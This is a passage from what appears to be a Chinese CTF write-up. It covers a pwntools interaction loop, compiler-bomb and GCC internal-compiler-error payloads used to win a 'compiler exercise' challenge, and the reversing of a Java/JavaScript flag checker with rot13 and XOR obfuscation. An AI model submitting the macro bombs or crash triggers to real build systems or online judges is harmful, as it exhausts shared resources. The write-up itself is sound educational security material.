    <span class="k">if</span> <span class="s">"质数"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">"答案正确"</span><span class="p">)</span>
</code></pre></div></div>

<p>其实最主要的两个 API 就是 <code class="language-plaintext highlighter-rouge">readuntil</code> 和 <code class="language-plaintext highlighter-rouge">sendline</code>，多 跑 几 次，就能出 flag 了。</p>

<h2 id="编原译理习题课">编原译理习题课</h2>

<p>去调研过 OJ 安全性的同学们都知道，编译器也是不靠谱的。这里有三个要求，分别对应三个 flag。</p>

<h3 id="flag-1产物超过-8mb">Flag 1：产物超过 8MB</h3>

<p>StackExchange Coldgolf 上对 compiler bomb 有<a href="https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb/">相关的讨论</a>。因为是 C++，有些 C 的 payload 是用不了的。最后我选择的是用<a href="https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb/69413#69413">多层 <code class="language-plaintext highlighter-rouge">#define</code> 的方式</a>搞出很大的编译产物。</p>

<p>直接复制是不行的：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define G A+A+A+A+A+A+A+A+A+A
#define A B+B+B+B+B+B+B+B+B+B
#define B C+C+C+C+C+C+C+C+C+C
#define C D+D+D+D+D+D+D+D+D+D
#define D E+E+E+E+E+E+E+E+E+E
#define E F+F+F+F+F+F+F+F+F+F
#define F x+x+x+x+x+x+x+x+x+x
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">G</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div></div>

<p>编译太慢了，要微调一下取得编译时间和程序大小的平衡。我参考了 <a href="https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb/111257#111257">https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb/111257#111257</a> 进行微调，结果如下：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
</span><span class="kt">long</span> <span class="kt">long</span> <span class="n">x</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="n">e</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{}</span>
</code></pre></div></div>

<h3 id="flag-2报错超过-2mb">Flag 2：报错超过 2MB</h3>

<p>众所周知，C++ 的模板能够产生大量错误信息——但是我这里没用模板，因为我自己也写不明白。我参考了 <a href="https://codegolf.stackexchange.com/questions/1956/generate-the-longest-error-message-in-c">https://codegolf.stackexchange.com/questions/1956/generate-the-longest-error-message-in-c</a>，最后 payload 如下：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include __FILE__
#include __FILE__
#include __FILE__
#include __FILE__
#include __FILE__
</span><span class="n">p</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="flag-3i-c-e">Flag 3：I C E!</h3>

<p>让编译器段错误什么的，这么严重的问题，当然得去 g++ 收 bug 的地方看。在 <a href="https://gcc.gnu.org/bugzilla/query.cgi">https://gcc.gnu.org/bugzilla/query.cgi</a> 搜索 <code class="language-plaintext highlighter-rouge">segfault</code>，然后按时间排序，过一遍就能看到 <a href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105300">https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105300</a> “[10/11/12/13 Regression] segfault from static_assert with user-defined string suffix argument”。直接复制即可：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="k">operator</span><span class="s">""</span><span class="n">_x</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
<span class="k">static_assert</span><span class="p">(</span><span class="nb">false</span><span class="p">,</span> <span class="s">"foo"</span><span class="n">_x</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="flag-checker">Flag Checker</h2>

<h3 id="flag-1java-逆向">Flag 1：Java 逆向</h3>

<p>简单的 Java 逆向。下载 jd-gui，然后把 jar 丢进去，阅读逻辑：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">actionPerformed</span><span class="o">(</span><span class="nc">ActionEvent</span> <span class="n">paramActionEvent</span><span class="o">)</span> <span class="o">{</span>
   <span class="k">try</span> <span class="o">{</span>
   <span class="k">if</span> <span class="o">(</span><span class="n">paramActionEvent</span><span class="o">.</span><span class="na">getSource</span><span class="o">()</span> <span class="o">==</span> <span class="k">this</span><span class="o">.</span><span class="na">button1</span><span class="o">)</span> <span class="o">{</span>
      <span class="kt">byte</span><span class="o">[]</span> <span class="n">arrayOfByte</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">textField1</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"UTF-8"</span><span class="o">);</span>
      <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">rot13</span><span class="o">(</span><span class="nc">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">arrayOfByte</span><span class="o">));</span>
      <span class="k">if</span> <span class="o">(</span><span class="s">"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">str</span><span class="o">))</span> <span class="o">{</span>
         <span class="nc">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="s">"Correct"</span><span class="o">);</span>
      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
         <span class="nc">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="s">"Wrong"</span><span class="o">);</span>
      <span class="o">}</span> 
   <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
      <span class="nc">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">invocable</span><span class="o">.</span><span class="na">invokeFunction</span><span class="o">((</span><span class="n">paramActionEvent</span><span class="o">.</span><span class="na">getSource</span><span class="o">()</span> <span class="o">==</span> <span class="k">this</span><span class="o">.</span><span class="na">button2</span><span class="o">)</span> <span class="o">?</span> <span class="s">"checkflag2"</span> <span class="o">:</span> <span class="s">"checkflag3"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]</span> <span class="o">{</span> <span class="k">this</span><span class="o">.</span><span class="na">textField1</span><span class="o">.</span><span class="na">getText</span><span class="o">()</span> <span class="o">});</span>
      <span class="nc">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">object</span><span class="o">);</span>
   <span class="o">}</span> 
   <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">exception</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">StringWriter</span> <span class="n">stringWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringWriter</span><span class="o">();</span>
      <span class="nc">PrintWriter</span> <span class="n">printWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrintWriter</span><span class="o">(</span><span class="n">stringWriter</span><span class="o">);</span>
      <span class="n">exception</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">(</span><span class="n">printWriter</span><span class="o">);</span>
      <span class="nc">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">stringWriter</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
   <span class="o">}</span> 
<span class="o">}</span>

<span class="kd">static</span> <span class="nc">String</span> <span class="nf">rot13</span><span class="o">(</span><span class="nc">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="o">{</span>
   <span class="nc">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
   <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="n">paramString</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">b</span><span class="o">++)</span> <span class="o">{</span>
   <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">paramString</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>
   <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'a'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'m'</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">c</span> <span class="o">+</span> <span class="mi">13</span><span class="o">);</span>
   <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'A'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'M'</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">c</span> <span class="o">+</span> <span class="mi">13</span><span class="o">);</span>
   <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'n'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'z'</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">c</span> <span class="o">-</span> <span class="mi">13</span><span class="o">);</span>
   <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'N'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">c</span> <span class="o">-</span> <span class="mi">13</span><span class="o">);</span>
   <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'5'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'9'</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">c</span> <span class="o">-</span> <span class="mi">5</span><span class="o">);</span>
   <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'0'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'4'</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">c</span> <span class="o">+</span> <span class="mi">5</span><span class="o">);</span>
   <span class="o">}</span> 
   <span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">c</span><span class="o">);</span>
   <span class="o">}</span> 
   <span class="k">return</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
<span class="o">}</span>
</code></pre></div></div>

<p>flag1 是改版的 rot13，这很简单：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">re_rot13</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="s">'n'</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'z'</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="s">'N'</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'Z'</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="s">'a'</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'m'</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="mi">13</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="s">'A'</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'M'</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="mi">13</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="s">'0'</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'4'</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="s">'5'</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'9'</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="mi">5</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">assert</span> <span class="mi">0</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="n">s</span> <span class="o">=</span> <span class="s">"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"</span>
<span class="k">print</span><span class="p">(</span><span class="n">re_rot13</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
</code></pre></div></div>

<h3 id="flag-2javascript-逆向">Flag 2：JavaScript 逆向</h3>

<p>然后看 flag2 的逻辑：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">ScriptEngineManager</span> <span class="n">scriptEngineManager</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ScriptEngineManager</span><span class="o">();</span>
    <span class="nc">ScriptEngine</span> <span class="n">scriptEngine</span> <span class="o">=</span> <span class="n">scriptEngineManager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"nashorn"</span><span class="o">);</span>
<span class="k">try</span> <span class="o">{</span>
   <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="s">"\u0089\u009A\u0081\u008C\u009B\u0086\u0080\u0081\u00CF\u008C\u0087\u008A\u008C\u0084\u0089\u0083\u008E\u0088\u00DD\u00C7\u00B0\u00DF\u0097\u008E\u00D7\u00DC\u008A\u0097\u00DD\u00C6\u0094\u0099\u008E\u009D\u00CF\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00D2\u00B4\u00C8\u008C\u0087\u008E\u009D\u00AC\u0080\u008B\u008A\u00AE\u009B\u00C8\u00C3\u00C8\u0082\u008E\u009F\u00C8\u00C3\u00C8\u00C8\u00C3\u00C8\u009C\u009F\u0083\u0086\u009B\u00C8\u00C3\u00C8\u009C\u009B\u009D\u0086\u0081\u0088\u0086\u0089\u0096\u00C8\u00C3\u00C8\u00AC\u0080\u009D\u009D\u008A\u008C\u009B\u00C8\u00C3\u00C8\u00B8\u009D\u0080\u0081\u0088\u00C8\u00C3\u00C8\u0085\u00C2\u00C8\u00B2\u00D4\u009D\u008A\u009B\u009A\u009D\u0081\u00CF\u00C7\u00A5\u00BC\u00A0\u00A1\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DB\u00B2\u00B2\u00C7\u00B0\u00DF\u0097\u008E\u00D7\u00DC\u008A\u0097\u00DD\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DC\u00B2\u00B2\u00C7\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DD\u00B2\u00C6\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DE\u00B2\u00B2\u00C7\u0089\u009A\u0081\u008C\u009B\u0086\u0080\u0081\u00C7\u00B0\u00DF\u0097\u008E\u00D7\u00DC\u008A\u0097\u00DC\u00C6\u0094\u009D\u008A\u009B\u009A\u009D\u0081\u00CF\u00B0\u00DF\u0097\u008E\u00D7\u00DC\u008A\u0097\u00DC\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DF\u00B2\u00B2\u00C7\u00DF\u00C6\u0092\u00C6\u00C6\u00D2\u00D2\u00CF\u00A5\u00BC\u00A0\u00A1\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DB\u00B2\u00B2\u00C7\u00B4\u00DF\u00C3\u00DE\u00DA\u00C3\u00DE\u00D9\u00C3\u00DE\u00D8\u00C3\u00DC\u00DF\u00C3\u00DE\u00DF\u00DA\u00C3\u00DE\u00D9\u00C3\u00DC\u00DE\u00C3\u00DE\u00D9\u00C3\u00D9\u00D8\u00C3\u00DC\u00C3\u00DC\u00DC\u00C3\u00DA\u00C3\u00D9\u00DF\u00C3\u00DB\u00C3\u00DE\u00DF\u00D9\u00C3\u00D9\u00C3\u00DB\u00DE\u00C3\u00DF\u00C3\u00DE\u00C3\u00D9\u00D8\u00C3\u00DC\u00C3\u00DE\u00D9\u00C3\u00DB\u00C3\u00D9\u00C3\u00DC\u00DC\u00C3\u00DD\u00DC\u00DD\u00B2\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DE\u00B2\u00B2\u00C7\u0089\u009A\u0081\u008C\u009B\u0086\u0080\u0081\u00C7\u00B0\u00DF\u0097\u008E\u00D7\u00DC\u008A\u0097\u00DC\u00C6\u0094\u009D\u008A\u009B\u009A\u009D\u0081\u00CF\u00C7\u008C\u0087\u008A\u008C\u0084\u0089\u0083\u008E\u0088\u00DD\u00C4\u00CF\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DD\u00B2\u00C6\u00B4\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DF\u00B2\u00B2\u00C7\u00B0\u00DF\u0097\u008E\u00D7\u00DC\u008A\u0097\u00DC\u00C6\u0092\u00C6\u00C6\u00D0\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00DA\u00B2\u00D5\u00B0\u00DF\u0097\u00D8\u00DD\u00DB\u008D\u00B4\u00D9\u00B2\u00C6\u0092"</span><span class="o">;</span>
   <span class="nc">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
   <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="n">str</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">b</span><span class="o">++)</span>
      <span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">((</span><span class="kt">char</span><span class="o">)(</span><span class="n">str</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">b</span><span class="o">)</span> <span class="o">^</span> <span class="mh">0xEF</span><span class="o">));</span> 
   <span class="n">scriptEngine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">exception</span><span class="o">)</span> <span class="o">{</span>
   <span class="nc">StringWriter</span> <span class="n">stringWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringWriter</span><span class="o">();</span>
   <span class="nc">PrintWriter</span> <span class="n">printWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PrintWriter</span><span class="o">(</span><span class="n">stringWriter</span><span class="o">);</span>
   <span class="n">exception</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">(</span><span class="n">printWriter</span><span class="o">);</span>
   <span class="nc">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">stringWriter</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="o">}</span>
</code></pre></div></div>

<p>“nashorn” 似乎是一个 JS 引擎。无论如何，先看看这一坨东西是啥：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x89\x9A\x81\x8C\x9B\x86</span><span class="s">（...后面的部分省略）"</span>
<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

<span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">^</span> <span class="mh">0xef</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">checkflag2</span><span class="p">(</span><span class="nx">_0xa83ex2</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x724b</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">,</span><span class="dl">''</span><span class="p">,</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">stringify</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Correct</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Wrong</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">j-</span><span class="dl">'</span><span class="p">];</span><span class="k">return</span> <span class="p">(</span><span class="nx">JSON</span><span class="p">[</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">4</span><span class="p">]](</span><span class="nx">_0xa83ex2</span><span class="p">[</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">1</span><span class="p">]](</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0xa83ex3</span><span class="p">){</span><span class="k">return</span> <span class="nx">_0xa83ex3</span><span class="p">[</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">0</span><span class="p">]](</span><span class="mi">0</span><span class="p">)}))</span><span class="o">==</span> <span class="nx">JSON</span><span class="p">[</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">4</span><span class="p">]]([</span><span class="mi">0</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">232</span><span class="p">][</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">1</span><span class="p">]](</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0xa83ex3</span><span class="p">){</span><span class="k">return</span> <span class="p">(</span><span class="nx">checkflag2</span><span class="o">+</span> <span class="nx">_0x724b</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">0</span><span class="p">]](</span><span class="nx">_0xa83ex3</span><span class="p">)}))?</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span><span class="nx">_0x724b</span><span class="p">[</span><span class="mi">6</span><span class="p">])}</span>
</code></pre></div></div>

<p>emmmmmm 拿了个 nodejs repl 一个一个变量看过去，最后这段代码的大概逻辑是：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">checkflag2</span><span class="p">(</span><span class="nx">_0xa83ex2</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">_0x724b</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">,</span><span class="dl">''</span><span class="p">,</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">stringify</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Correct</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Wrong</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">j-</span><span class="dl">'</span><span class="p">];</span>
    <span class="k">return</span> <span class="p">(</span>
        <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">_0xa83ex2</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span>
            <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
                <span class="k">return</span> <span class="nx">x</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
            <span class="p">})</span>
        <span class="p">)</span> <span class="o">==</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span 